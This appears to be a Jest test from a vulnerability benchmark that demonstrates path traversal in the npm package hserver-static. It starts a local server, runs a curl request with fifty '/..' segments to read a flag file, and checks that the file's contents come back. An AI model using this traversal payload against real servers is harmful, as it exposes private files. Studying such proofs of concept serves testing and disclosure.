var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8990/tcp");
  } catch (e) {}
});
("use strict");
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in hserver-static", (done) => {
  expect.assertions(1);
  const Hserver = require("hserver");
  const Hstatic = require("hserver-static");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8990/tcp", () => {});
  } catch (e) {}
  const port = 8990;
  const app = new Hserver();
  app.use(function (next) {
    const start = new Date();
    this.res.once("finish", () => {
      const ms = new Date() - start;
      console.log("%s %s %s - time:%s", this.status, this.method, this.url, ms);
    });
    next();
  });
  app.use(
    Hstatic({
      router: "/",
      root: "www",
      index: "index.html",
      method: ["GET", "HEAD"],
      zip: true,
      cache: 7200,
      etag: true,
    })
  );
  app.listen(port);
  console.log(`Server is running at http://127.0.0.1:${port}/`);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8990${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
